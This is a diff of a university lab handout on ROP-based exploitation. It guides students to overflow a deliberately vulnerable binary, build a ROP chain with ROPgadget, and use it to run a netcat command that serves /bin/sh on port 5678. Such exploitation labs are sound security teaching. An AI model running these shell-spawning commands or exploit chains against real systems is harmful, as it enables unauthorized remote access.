@@ -1,28 +1,38 @@
 # Lab 4 - ROP based Exploitation
 
-Watch the [video](https://web.microsoftstream.com/video/2463603d-0f94-4e62-863b-f1c40918f072) for details on this lab. Concrete steps are also outlined below. To see a step by step process of using ROPGadget (the ones we saw in the lecture video), check [this page](ropgadget-steps.md)
+**Task 1**: Exploit the program and use ROPgadget to generate a ROP shellcode.
 
-<iframe width="640" height="360" src="https://web.microsoftstream.com/embed/video/2463603d-0f94-4e62-863b-f1c40918f072?autoplay=false&amp;showinfo=true" allowfullscreen style="border:none;"></iframe>
-
-**Aim**: open a port on the victim machine using netcat tool that returns a shell (reverse shell exploit).
+**Task 2**: Write using ROPgadget a custom shellcode to spawn a reverse shell.
 
 Setting up the environment:  
 
-0. download ROPGadget and install from: [URL](https://github.com/JonathanSalwan/ROPgadget). Its a github repo, so you can either clone it or (suggested) simple use "Download zip" option.  
-1. Download netcat (the latest release of netcat that comes pre-installed in Ubunut has removed a particular option (-e) that we need.
+0. download ROPGadget and install from: [URL](https://github.com/JonathanSalwan/ROPgadget). Its a github repo, so you can either clone it or (suggested) simple use "Download zip" option. 
+1. Download netcat (the latest release of netcat that comes pre-installed in Ubuntu has removed a particular option (-e) that we need.
 Having said that, official netcat release still shipped with that option! So, we are not completely artificial ;). [URL:](https://sourceforge.net/projects/netcat/). However, the same is also avaialble [here](../code/nc071.tar.gz).
-2. untar it and build-- `./configure` and `make` command (**do not do** *make install*!)
-3. move `src/netcat` to `/tmp/--` `cp src/netcat /tmp/nc` (check if the binary is working as expected `/tmp/nc --help`).
+2. untar it and build: `./configure` and `make` command (**do not do** *make install*!)
+3. move `src/netcat` to `/tmp/nc`: `cp src/netcat /tmp/nc` (check if the binary is working as expected `/tmp/nc --help`).
 4. Compile [vuln3.c](../code/vuln3.c) as `gcc -fno-stack-protector -m32 -static vuln3.c -o vuln3-32`
-5. Use the same trick we saw in the lecture video to find the offsets where the input starts overwriting the saved return addr.
-6. Start populating the supplied ROP exploit python script: [exploit-nc-skeleton.py](../code/exploit-rop-nc-skeleton.py). For this step, you use ROPGadget.py to find ROP chain:
+5. Find the amount of padding you'll need to overflow the buffer and start overwriting the saved return address.
+6. Use ROPgadget to build a ROP shellcode. 
 
-		./ROPgadget.py --binary vuln3-32 --ropchain > out-rop.txt
+		ROPgadget --binary vuln3-32 --ropchain > out-rop.txt
+		
+   Have a look at `out-rop.txt`.  You'll see that at the bottom there is a Python program which you can complete to generate your shellcode exploit (in particular the buffer padding).  Run the program generate the exploit and test it works with the vulnerable program.
+7. The shellcode in the previous step execve'd `/bin/sh`.  This time we'd like you to run the following command:
 
-\[Note: in case your ROPgadget reports that it could not find a chain on this binary, you can use [this binary](../code/vuln3-32). In worst case, if that still does not work, use VM that you used in your lab 1 -2 and repeat the whole steps\]
-7. You have helper files to consult [exploit-nc.py](../code/exploit-nc.py) and [exploit-rop.py](../code/exploit-rop.py)
+		/tmp/nc -lnp 5678 -tte /bin/sh
+
+   This command will spawn a reverse-shell server listening on localhost port 5678 that feeds all the input it gets into `/bin/sh`.  Effectively enabling you to run programs remotely!
+We're giving helper files to consult which provide a similar exploit for a different machine: [exploit-nc.py](../code/exploit-nc.py), but you'll need to get it working on *your* machine.  In particular the gadgets, configuration and Python version may be different!
 8. Once successful, open another terminal and type:  
 ```
 $/tmp/nc 127.0.0.1 5678
 pwd
 ```
+
+# Hints
+
+1. To figure out the padding needed to overflow the buffer try using binary search.  If you run `perl -e 'print "A"x124, "DCBA"' >input` you can quickly test different inputs. What would you expect to see when you have correctly got control of the return address?  What would you expect to see if you've gone too far compared to not far enough?
+2. Can't concatenate strings and bytes?  Just use bytes! `bytes("Your string", "ascii")`.
+3. Try and get the exploit chain running first!  Break on the first gadget (In GDB: `b *0x08BLABLA`) and check it is working as expected.  Are things going into the right registers? (In GDB: `si`: step instruction, `i r`: info registers)
+4. Once you're convinced the ROP chain is running the `strace` tool is very helpful to debug what system calls *actually* get made by your program.  The `-v` flag will show all the arguments to system calls, `-e trace=execve` to just show `execve` calls.
